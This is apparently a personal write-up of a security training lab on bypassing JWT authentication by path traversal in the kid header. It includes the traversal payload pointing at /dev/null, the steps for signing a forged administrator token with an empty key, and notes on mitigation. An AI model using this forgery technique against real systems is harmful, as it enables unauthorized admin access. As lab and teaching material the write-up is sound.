# Lab06 - JWT Authentication Bypass Via KID Header Path Traversal

## Objective

Abuse the `kid` header to make the server use a predictable local file as the verification key.

Delete:

```text
carlos
```

Credentials:

```text
wiener:peter
```

---

# Vulnerability Overview

The server stores verification keys on the filesystem.

Instead of validating the `kid` parameter, it uses it directly.

This allows directory traversal.

---

# Attack Flow

```text
Modify kid
        ↓
Directory Traversal
        ↓
Known File Used As Secret
        ↓
Forge JWT
```

---

# Generate Signing Key

Create:

```text
New Symmetric Key
```

Replace:

```text
k
```

with:

```text
(empty string)
```

Save.

---

# Modify JWT

Change:

```text
sub = administrator
```

Modify:

```json
{
   "kid":"../../../../../../../dev/null"
}
```

Sign the JWT using the empty-string key.

Replay:

```http
GET /admin
```

Administrator access is granted.

Delete:

```text
carlos
```

---

# Why It Works

```text
kid
        ↓
Filesystem Lookup
        ↓
/dev/null
        ↓
Empty Secret
        ↓
Signature Valid
```

---

# Personal Analysis

Whenever I encounter:

```text
kid
```

I ask:

```text
Database?

Filesystem?

Cache?

Key Store?
```

---

# Bug Bounty Indicators

```text
Filesystem Key Storage

Path Traversal

Predictable Files
```

---

# Impact

```text
JWT Forgery

Authentication Bypass
```

---

# Mitigation

```text
Never Treat kid As A File Path

Use Key Mapping

Validate IDs
```

---

# Related Theory

```text
12-kid-header-injection.md
```

---

# Key Learnings

A Key ID should never become a filesystem path.